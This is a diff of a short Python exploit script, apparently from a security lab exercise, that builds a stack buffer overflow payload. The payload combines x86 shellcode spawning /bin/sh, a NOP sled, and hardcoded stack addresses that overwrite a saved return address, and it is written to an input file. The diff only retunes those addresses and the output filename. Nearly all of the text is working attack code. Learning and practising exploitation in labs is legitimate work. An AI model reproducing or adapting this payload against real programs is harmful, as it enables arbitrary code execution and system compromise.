@@ -8,18 +8,16 @@ def fixEndian(b):
         return c
 
 myName = "Mark Thompson".encode()
+#shcode = '909090b4f3ffbf31c050686e2f7368682f2f626989e35089e25389e1b00bcd80'
 shcode = '90909031c050686e2f7368682f2f626989e35089e25389e1b00bcd80'
 shcode = binascii.a2b_hex(''.join(shcode))
-retAdr = 'bffff3e0'
-nameAdr= 'bffff3c0'
+retAdr = 'bffff3b0'
 
-#s=[nameAdr,'000002e1','0804b008','0000030c','b7fcdac0','00000004','bffff6d8', retAdr]
-
-s2 =['d0f3ffbf', 'e1020000', '08b00408', 'fc020000','c0dafcb7', '04000000', '08f7ffbf', fixEndian(retAdr)]
+s=['bffff3a0','000002e1','0804b008','0000030c','b7fcdac0','00000004','bffff6d8', retAdr]
 
 sp = ''
-for i in range(len(s2)):
-        sp += s2[i]
+for i in range(len(s)):
+        sp += fixEndian(s[i])
 
 #create long buffer string, using NOP code 90. 
 buffLen = 711
@@ -32,5 +30,5 @@ sp = binascii.a2b_hex(''.join(sp))
 
 by = myName + shcode + buffString + sp 
          # return address that should overwrite the existing return address and send code to shell code
-f = open('input','wb')
+f = open('testFile-worksgdb','wb')
 f.write(by)
